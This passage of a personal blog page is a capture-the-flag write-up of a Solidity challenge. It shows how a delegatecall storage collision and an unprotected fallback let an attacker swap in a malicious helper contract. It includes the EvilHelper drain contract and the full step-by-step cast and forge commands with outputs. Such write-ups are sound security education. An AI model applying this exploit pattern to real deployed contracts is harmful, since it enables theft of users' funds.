+                but let's rewind a second, because my actual first move was
+                dumber than that.
+              </p>
+              <p>
+                First thing I tried was just replaying the part-one reentrancy
+                attack against this contract. Obv it reverted with
+                <code>"Reentrancy detected"</code>, so that's dead, there's a
+                <code>noReentrancy</code> modifier on <code>withdrawPP()</code>
+                now that flips a <code>locked</code> boolean on entry and
+                refuses to run again while it's set. Fine, expected ig,
+                once I actually read the rest of the contract it was
+                obvious they'd introduced something worse while trying to
+                look more secure. 
+              </p>
+              <pre><code class="language-solidity">contract PerformancePointHelper {
+    uint256 id_number;
+    address public atm;
+    bool public helping;
+
+    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
+        (bool success, ) = recipient.call{value: amount}("");
+        return success;
+    }
+    function setATM(address _atm) public { atm = _atm; }
+    function stopHelping() public { helping = false; }
+    function startHelping() public { helping = true; }
+}
+
+contract PerformancePointATM {
+    mapping(address => uint256) public scores;
+    address public performancePointHelper;
+    bool public locked;
+
+    modifier noReentrancy() {
+        require(!locked, "Reentrancy detected");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function withdrawPP() public noReentrancy {
+        uint256 score = scores[msg.sender];
+        require(score > 0, "Nothing to withdraw");
+        (bool success, ) = performancePointHelper.delegatecall(
+            abi.encodeWithSignature("processWithdrawal(address,uint256)", msg.sender, score)
+        );
+        require(success, "Transfer failed");
+        scores[msg.sender] = 0;
+    }
+
+    fallback() external payable {
+        address _impl = performancePointHelper;
+        bytes4 selector = msg.sig;
+        bytes4 initSelector = bytes4(keccak256("processWithdrawal(address,uint256)"));
+        require(selector != initSelector, "processWithdrawal blocked");
+
+        assembly {
+            let ptr := mload(0x40)
+            calldatacopy(ptr, 0, calldatasize())
+            let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)
+            returndatacopy(ptr, 0, returndatasize())
+            if iszero(success) { revert(ptr, returndatasize()) }
+            return(ptr, returndatasize())
+        }
+    }
+}</code></pre>
+              <p>
+                Two things worth nailing down before the exploit makes sense.
+              </p>
+              <p>
+                First, <code>delegatecall</code>. I remembered the gist but
+                double-checked against
+                <a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-and-libraries" target="_blank" rel="noopener">the Solidity docs</a>
+                to be sure: a normal external call (like <code>msg.sender.call</code>
+                in part one) runs the target's code in <em>the target's own</em>
+                storage. <code>delegatecall</code> doesn't, it runs the
+                target's code but keeps executing against <em>the caller's</em>
+                storage, like the target's functions got copy-pasted straight
+                into the caller. This is the whole mechanism behind
+                upgradeable proxy patterns: a thin proxy holds all the state,
+                delegates its logic to a separate implementation contract that
+                can get swapped out later. Here, <code>withdrawPP()</code>
+                uses it to hand the actual transfer off to
+                <code>performancePointHelper</code>, presumably so the ATM's
+                core logic can call out to a "trusted" payout module without
+                duplicating the transfer code.
+              </p>
+              <p>
+                <code>delegatecall</code> addresses storage by <strong>slot
+                number</strong>, not by variable name.
+                Formally, given two contracts $A$ and $B$ with layouts
+                $$A:\ \text{slot}_0 \to v_0^A,\quad \text{slot}_1 \to v_1^A,\quad \ldots$$
+                $$B:\ \text{slot}_0 \to v_0^B,\quad \text{slot}_1 \to v_1^B,\quad \ldots$$
+                a <code>delegatecall</code> from $A$ into $B$ that emits
+                <code>sstore(k, x)</code> writes $x$ into $\text{slot}_k$ of
+                <em>$A$'s</em> storage, trampling $v_k^A$ regardless of what
+                $v_k^B$ was supposed to be. Solidity's compiler never validates
+                that the two contracts agree on what lives at slot $k$.
+              </p>
+              <p>
+                This has a name: <strong>storage collision</strong>. And it has a
+                body count. The
+                <a href="https://www.gemini.com/cryptopedia/parity-hack-ethereum" target="_blank" rel="noopener">Parity multisig hack in 2017</a>
+                lost around $30M to this exact mechanism. Their wallet library had
+                an <code>initWallet()</code> function that was supposed to be called
+                once during setup. Because the wallet used <code>delegatecall</code>
+                into the library, and because nobody protected <code>initWallet()</code>
+                after the initial deploy, any stranger could call it, overwrite the
+                owner slot in the wallet's storage, and take over. The Parity devs
+                were smart people writing carefully reviewed code. They just didn't
+                track what slot <code>owner</code> landed on in both contracts.
+              </p>
+              <p>
+                Second, <code>fallback()</code>. This is
+                <a href="https://docs.soliditylang.org/en/latest/contracts.html#fallback-function" target="_blank" rel="noopener">the function Solidity runs</a>
+                when a call comes in for a selector the contract doesn't
+                recognize. The authors used it to build a mini-proxy: any
+                unrecognized call to the ATM gets forwarded, via
+                <code>delegatecall</code>, into whatever
+                <code>performancePointHelper</code> currently points at,
+                except one selector, <code>processWithdrawal(address,uint256)</code>,
+                which gets explicitly blocked so nobody bypasses the score
+                check by calling it directly. It's the same fallback +
+                delegatecall pattern real minimal proxies use, see
+                <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol" target="_blank" rel="noopener">OpenZeppelin's <code>Proxy.sol</code></a>
+                for what the production version looks like.
+              </p>
+              <p>
+                Okay, so that blocklist is exactly one selector wide. Every
+                <em>other</em> function on <code>PerformancePointHelper</code>,
+                <code>setATM</code>, <code>stopHelping</code>,
+                <code>startHelping</code>, is still reachable straight through
+                the ATM's fallback. But I didn't clock the
+                actual bug until I remembered what <code>delegatecall</code>
+                does to storage: it runs the helper's code <em>against the
+                ATM's own storage</em>. So what does <code>setATM(address _atm)</code>
+                actually write to, when it's running in that context and not
+                its own? Hmmm
+              
+              </p>
+              <p>
+                Had to pull up how Solidity
+                <a href="https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html" target="_blank" rel="noopener">lays out storage</a>
+                to answer that properly. State variables get storage slots in
+                declaration order, starting from slot 0. Lined up both
+                contracts side by side:
+              </p>
+              <table>
+                <tr><th>Slot</th><th>PerformancePointATM (caller)</th><th>PerformancePointHelper (callee)</th></tr>
+                <tr><td>0</td><td><code>mapping scores</code></td><td><code>uint256 id_number</code></td></tr>
+                <tr><td>1</td><td><code>address performancePointHelper</code></td><td><code>address atm</code></td></tr>
+                <tr><td>2</td><td><code>bool locked</code></td><td><code>bool helping</code></td></tr>
+              </table>
+              <p>
+                The industry answer to this is
+                <a href="https://eips.ethereum.org/EIPS/eip-1967" target="_blank" rel="noopener">EIP-1967</a>,
+                which OpenZeppelin's upgradeable proxy uses. Instead of declaring
+                the implementation address as a normal variable (which would land
+                at some small, predictable slot number), EIP-1967 derives the slot
+                from a hash:
+              </p>
+              <pre><code>bytes32 constant IMPL_SLOT =
+    bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
+    // = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code></pre>
+              <p>
+                Nothing in normal Solidity code ever declares a variable at that
+                address. The pointer is written there directly via low-level
+                <code>sstore</code>, invisible to the Solidity layout engine.
+                For an attacker to collide with it they'd need to find a declared
+                variable that hashes to <code>0x360894...</code>, which is a
+                Keccak-256 preimage problem. The ATM just uses
+                <code>address public performancePointHelper</code>, slot 1,
+                first-come-first-served.
+              </p>
+              <p>
+                So, the helper's <code>atm</code> variable sits at slot
+                1, and the ATM's own <code>performancePointHelper</code> pointer
+                also sits at slot 1. Solidity storage doesn't know or care about
+                variable <em>names</em>. It's just numbered slots, and
+                <code>delegatecall</code> makes the callee's code write into the
+                caller's slots. So when <code>setATM(_atm)</code> executes
+                <code>atm = _atm</code> while delegatecalled from the ATM, it is,
+                byte for byte, the same operation as writing to the ATM's
+                <code>performancePointHelper</code>. This is a 
+                <strong>storage collision</strong>: two contracts sharing storage
+                via delegatecall must agree on their slot layout, or writes meant
+                for one variable land on a completely different one.
+              </p>
+              <p>
+                Putting it together: <code>ATM.setATM(evilAddress)</code> is
+                callable by anyone, with no permission check, and it silently
+                repoints the ATM's real <code>performancePointHelper</code> at
+                whatever address we choose. From that point on, every
+                <code>withdrawPP()</code> call delegatecalls into <em>our</em>
+                contract instead of the legitimate helper.
+              </p>
+              <p>
+                So my idea was to  deploy a malicious helper that ignores the
+                <code>amount</code> parameter it's given and just steals
+                everything, then use <code>setATM</code> to swap it in.
+              </p>
+              <pre><code class="language-solidity">contract EvilHelper {
+    // runs in ATM storage context via delegatecall
+    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
+        (bool s, ) = recipient.call{value: address(this).balance}("");
+        return s;
+    }
+}</code></pre>
+              <p>
+                Notice <code>address(this).balance</code>, inside a
+                delegatecall, <code>this</code> still refers to the caller (the
+                ATM), not the contract whose code is running. So
+                <code>address(this).balance</code> is the ATM's full ETH balance,
+                and we forward all of it to <code>recipient</code> regardless of
+                what the legitimate <code>amount</code> argument said. Also worth
+                noting: the <code>noReentrancy</code> guard the challenge added
+                is completely irrelevant to this attack. We never call
+                <code>withdrawPP()</code> a second time from inside itself.
+                We call it exactly once, normally, and it happens to delegatecall
+                into code we control. The guard was built to stop the part-one
+                attack; it does nothing against a hijacked delegatecall target.
+              </p>
+              <p>
+                Same as part one, this is a real run
+                against the live instance,
+              </p>
+              <p>
+                <strong>Step 0, set up env vars and confirm the starting
+                state.</strong> Same idea as part one: know your balances and
+                the ATM's current wiring before touching anything. We also
+                check <code>performancePointHelper()</code> and
+                <code>locked()</code> up front, that's the "before" picture
+                we're about to change.
+              </p>
+              <pre><code class="language-bash">cd blockchain_pp-farming-2
+export RPC_URL="https://eth.chals.sekai.team/&lt;instance-id&gt;/main"
+export PK="&lt;player private key&gt;"
+export ATM_ADDR="0x71364db63C1690034a82C87271Ef4E77c356850A"
+
+PLAYER=$(cast wallet address --private-key $PK)
+echo "Player: $PLAYER"
+cast balance $PLAYER --rpc-url $RPC_URL --ether
+cast balance $ATM_ADDR --rpc-url $RPC_URL --ether
+cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL
+cast call $ATM_ADDR "locked()(bool)" --rpc-url $RPC_URL</code></pre>
+              <pre><code>Player: 0xa12A0B56AD1A7A814180F0f984aB53F9D4071AA7
+1000.000000000000000000
+10.000000000000000000
+0x074D594A86Fd354B09C860e0254c645aAf5A66e3
+false</code></pre>
+              <p>
+                1000 ETH to spend on gas, ATM funded with 10 ETH just like part
+                one, the legitimate helper is deployed at
+                <code>0x074D...a66e3</code>, and <code>locked</code> is
+                <code>false</code>, the <code>noReentrancy</code> guard is
+                currently open, as expected between transactions.
+              </p>
+              <p>
+                <strong>Step 1, deploy the malicious helper.</strong>
+                Same <code>forge create</code> as before. The contract lands on
+                chain at its own address but isn't wired into anything yet.
+              </p>
+              <pre><code class="language-bash">forge create --rpc-url $RPC_URL --private-key $PK --broadcast \
+    src/Evil.sol:EvilHelper</code></pre>
+              <pre><code>Deployer: 0xa12A0B56AD1A7A814180F0f984aB53F9D4071AA7
+Deployed to: 0xb77292E167831C731082e184b83b200F9Fadb21C
+Transaction hash: 0xd0f28086332b9ece789eada02f106ebc973b97b7dc84667271f650e7a0a126ca</code></pre>
+              <p>
+                <strong>Step 2, hijack <code>performancePointHelper</code>
+                via the unauthenticated fallback.</strong> Calling
+                <code>setATM(address)</code> on the ATM hits no known selector,
+                so <code>fallback()</code> picks it up and delegatecalls it into
+                the helper. That write lands on slot 1 of the ATM's own storage,
+                overwriting <code>performancePointHelper</code>. No permission
+                check, no event, no trace except the storage diff.
+              </p>
+              <pre><code class="language-bash">export EVIL="0xb77292E167831C731082e184b83b200F9Fadb21C"
+cast send $ATM_ADDR "setATM(address)" $EVIL --rpc-url $RPC_URL --private-key $PK
+
+# verify the hijack worked
+cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL</code></pre>
+              <pre><code>status               1 (success)
+transactionHash      0x663dadf5e4c6363528bb567e2b718483c06752373d8fe5b1d70a8a987d7d90e8
+to                   0x71364db63C1690034a82C87271Ef4E77c356850A
+
+0xb77292E167831C731082e184b83b200F9Fadb21C</code></pre>
+              <p>
+                Confirmed: <code>performancePointHelper()</code> now returns
+                our <code>EvilHelper</code> address instead of the original
+                <code>0x074D...a66e3</code>. We did this with one plain call,
+                no exploit contract needed, because the vulnerable write path
+                is reachable directly through the ATM's own fallback.
+              </p>
+              <p>
+                <strong>Step 3, seed a nonzero score.</strong>
+                <code>withdrawPP()</code> still checks
+                <code>require(score > 0)</code> before doing anything, so we need
+                <em>sm</em> balance recorded for our own address. A tiny
+                donation is enough, the amount doesn't matter anymore since
+                <code>EvilHelper</code> ignores it and drains everything
+                regardless. 
+              </p>
+              <pre><code class="language-bash">cast send $ATM_ADDR "donatePP(address)" $PLAYER \
+    --value 0.01ether --rpc-url $RPC_URL --private-key $PK</code></pre>
+              <pre><code>status               1 (success)
+transactionHash      0x142bb94e48f3ec719cd8407ed02ebbeaf4a1adc510e627d674a63090c12ef814</code></pre>
+              <p>
+                <strong>Step 4, withdraw.</strong> This is a completely
+                ordinary call to <code>withdrawPP()</code>. The only difference is
+                that <code>performancePointHelper</code> now points at our
+                contract, so the delegatecall inside it runs our
+                <code>processWithdrawal</code>, which drains the entire ATM
+                balance to us instead of just our 0.01 ether score.
+              </p>
+              <pre><code class="language-bash">cast send $ATM_ADDR "withdrawPP()" --rpc-url $RPC_URL --private-key $PK
+
+cast balance $ATM_ADDR --rpc-url $RPC_URL --ether
+cast call $ATM_ADDR "isSolved()(bool)" --rpc-url $RPC_URL</code></pre>
+              <pre><code>status               1 (success)
+transactionHash      0x3766a46689c81af98f6e787c6780fdbf3d8328d56e0cad60a758f3f19faad7e0
+
+0.000000000000000000
+true</code></pre>
+              <p>
+                ATM balance went from 10 ETH to exactly <code>0</code>, and
+                <code>isSolved()</code> returns <code>true</code>, the same
+                success condition as part one, reached through a completely
+                different bug class: not by calling <code>withdrawPP()</code>
+                a hundred times, but by redirecting where its one legitimate
+                call to <code>delegatecall</code> actually goes. Flag:
+              </p>
+              <pre><code>SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}</code></pre>
+              <p>
+                <strong>Artifact trail, part two.</strong> This one's a better
+                incident write-up exercise than part one, because on its own
+                every single transaction below looks completely benign. No
+                function reverted, no gas spike, no obviously malicious
+                selector. The only "IOC" is the state diff on
+                <code>performancePointHelper</code> between transaction 2 and
+                transaction 3, which is invisible unless you're specifically
+                watching that storage slot:
+              </p>
+              <table>
+                <tr><th>Block</th><th>Tx hash</th><th>Action</th><th>State change</th></tr>
+                <tr><td>3</td><td><code>0xd0f28086&hellip;a126ca</code></td><td>Deploy <code>EvilHelper</code></td><td>none yet, inert code on chain</td></tr>
+                <tr><td>4</td><td><code>0x663dadf5&hellip;d90e8</code></td><td><code>setATM(evilHelper)</code> via fallback</td><td><code>performancePointHelper</code>: <code>0x074D&hellip;a66e3</code> &rarr; <code>0xb772&hellip;db21C</code></td></tr>
+                <tr><td>5</td><td><code>0x142bb94e&hellip;ef814</code></td><td><code>donatePP(self, 0.01 ETH)</code></td><td><code>scores[self]</code>: 0 &rarr; 0.01 ETH</td></tr>
+                <tr><td>6</td><td><code>0x3766a466&hellip;faad7e0</code></td><td><code>withdrawPP()</code></td><td>ATM balance: 10 &rarr; 0 ETH</td></tr>
+              </table>
+              <p>
+                
+              </p>
+              <p>
+                The root cause here is the same shape as
+                <a href="https://swcregistry.io/docs/SWC-112/" target="_blank" rel="noopener">SWC-112, delegatecall to untrusted callee</a>,
+                and the classic
+                <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/" target="_blank" rel="noopener">unstructured-proxy storage collision</a>
+                bug class that's bitten real upgradeable-proxy deployments in
+                production. OpenZeppelin's
+                <a href="https://docs.openzeppelin.com/upgrades-plugins/writing-upgradeable" target="_blank" rel="noopener">unstructured storage pattern</a>
+                exists specifically to avoid this class of bug in real proxies.
+                Any time <code>delegatecall</code> crosses a contract boundary,
+                the two storage layouts have to agree byte for byte, or whoever
+                controls the callee's write path effectively controls the
+                caller's state.
+              </p>
+
+              <h2>Takeaways</h2>
+              <p>
+                 do effects before interactions, or
+                use a reentrancy guard. Part two shows why the guard alone isn't
+                enough. If the "safe" withdrawal path is itself a
+                <code>delegatecall</code> into a swappable address, and that address
+                is swappable through a side door with no auth, the reentrancy fix is
+                solving the wrong problem.
+              </p>
+            </div>
+            <div class="status-bar mt-16">
+              <a href="../blog.html" class="btn">
+                <img
+                  src="https://win98icons.alexmeub.com/icons/png/undo-0.png"
+                  class="icon-16"
+                  alt=""
+                />
+                Back to All Posts
+              </a>
+            </div>
+          </div>
+        </div>
+        <div style="margin-bottom: 60px"></div>
+      </div>
+    </div>
+    <div class="taskbar">
+      <div style="display: flex; gap: 8px">
+        <a href="../index.html" class="start-button">
+          <img
+            src="https://win98icons.alexmeub.com/icons/png/windows-0.png"
+            class="icon-16"
+            alt=""
+          />
+          Start
+        </a>
+        <div style="border-left: 2px groove #c0c0c0; margin: 2px 4px"></div>
+        <a
+          href="../blog.html"
+          class="btn"
+          style="display: inline-flex; align-items: center; gap: 4px"
+        >
+          <img
+            src="https://win98icons.alexmeub.com/icons/png/notepad-0.png"
+            class="icon-16"
+            alt=""
+          />
+          Blog
+        </a>
+        <a
+          href="#"
+          class="btn"
+          style="
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            border: 2px inset #fff;
+          "
+        >
+          <img
+            src="https://win98icons.alexmeub.com/icons/png/write_wordpad-0.png"
+            class="icon-16"
+            alt=""
+          />
+          Reading
+        </a>
+      </div>
+      <div class="tray">
+        <img src="https://win98icons.alexmeub.com/icons/png/loudspeaker_rays-0.png" class="icon-16" alt="" title="Volume" style="image-rendering:pixelated" />
+        <img src="https://win98icons.alexmeub.com/icons/png/modem-0.png" class="icon-16" alt="" title="Network" style="image-rendering:pixelated" />
+        <div class="time" id="clock">12:00 PM</div>
+      </div>
+    </div>
+    <script>
+      function updateClock() {
+        const now = new Date();
+        let hours = now.getHours();
+        const minutes = now.getMinutes().toString().padStart(2, "0");
+        const ampm = hours >= 12 ? "PM" : "AM";
+        hours = hours % 12;
+        hours = hours ? hours : 12;
+        document.getElementById("clock").textContent =
+          hours + ":" + minutes + " " + ampm;
+      }
+      updateClock();
+      setInterval(updateClock, 1000);
+    </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script>
+      hljs.highlightAll();
+
+      // highlight.js has no bundled Solidity grammar, hand-roll it with
+      // the same .hljs-* classes the theme already styles.
+      (function () {
+        var KEYWORDS = ["pragma","solidity","contract","interface","library","function","external","public","private","internal","view","pure","payable","returns","return","memory","storage","calldata","constructor","modifier","require","revert","assert","if","else","for","while","do","break","continue","new","delete","import","is","abstract","virtual","override","event","emit","indexed","struct","enum","mapping","using","assembly","let","this","super"];
+        var TYPES = ["uint256","uint","uint8","uint16","uint32","uint64","uint128","int256","int","int8","address","bool","bytes","bytes4","bytes32","string"];
+        var LITERALS = ["true","false","msg","block","tx","wei","ether","gwei"];
+        var WORD_RE = new RegExp(
+          "(\\/\\/[^\\n]*)" +                // 1: line comment
+          '|("(?:[^"\\\\]|\\\\.)*")' +        // 2: double-quoted string
+          "|\\b(" + KEYWORDS.join("|") + ")\\b" + // 3: keyword
+          "|\\b(" + TYPES.join("|") + ")\\b" +    // 4: type
+          "|\\b(" + LITERALS.join("|") + ")\\b" + // 5: literal
+          "|\\b(\\d+)\\b",                        // 6: number
+          "g"
+        );
+
+        function highlightSolidity(code) {
+          return code.replace(WORD_RE, function (m, comment, str, kw, ty, lit, num) {
+            if (comment) return '<span class="hljs-comment">' + comment + "</span>";
+            if (str) return '<span class="hljs-string">' + str + "</span>";
+            if (kw) return '<span class="hljs-keyword">' + kw + "</span>";
+            if (ty) return '<span class="hljs-type">' + ty + "</span>";
+            if (lit) return '<span class="hljs-literal">' + lit + "</span>";
+            if (num) return '<span class="hljs-number">' + num + "</span>";
+            return m;
+          });
+        }
+
+        document.querySelectorAll("code.language-solidity").forEach(function (block) {
+          var raw = block.textContent;
+          var escaped = raw
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;");
+          block.innerHTML = highlightSolidity(escaped);
+          block.classList.add("hljs");
+        });
+      })();
+    </script>
+    <script>
+      document.querySelectorAll(".handout-box").forEach(function (box) {
+        box.querySelectorAll(".handout-tab").forEach(function (tab) {
+          tab.addEventListener("click", function () {
+            var file = tab.getAttribute("data-file");
+            box.querySelectorAll(".handout-tab").forEach(function (t) {
+              t.classList.toggle("active", t === tab);
+            });
+            box.querySelectorAll(".handout-pane").forEach(function (p) {
+              p.classList.toggle("active", p.getAttribute("data-file") === file);
+            });
+          });
+        });
+      });
+    </script>
+    <script src="../site.js"></script>
+</body>
+</html>
